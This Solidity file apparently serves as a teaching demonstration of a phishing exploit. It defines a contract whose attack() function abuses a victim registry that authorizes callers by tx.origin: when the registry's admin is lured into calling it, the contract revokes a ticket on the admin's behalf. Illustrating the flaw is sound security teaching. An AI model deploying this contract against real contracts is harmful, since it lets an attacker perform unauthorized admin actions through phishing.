// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVulnerableTicketRegistry {
    function revokeTicket(uint256 ticketId) external;
}

/// @notice Demonstrates why tx.origin must not be used for authorization.
/// @dev If the vulnerable registry admin is tricked into calling attack(),
///      tx.origin remains the admin while msg.sender at the victim is this contract.
contract TxOriginPhishingAttacker {
    event AttackForwarded(address indexed victim, uint256 indexed ticketId, address indexed caller);

    function attack(address victim, uint256 ticketId) external {
        IVulnerableTicketRegistry(victim).revokeTicket(ticketId);
        emit AttackForwarded(victim, ticketId, msg.sender);
    }
}
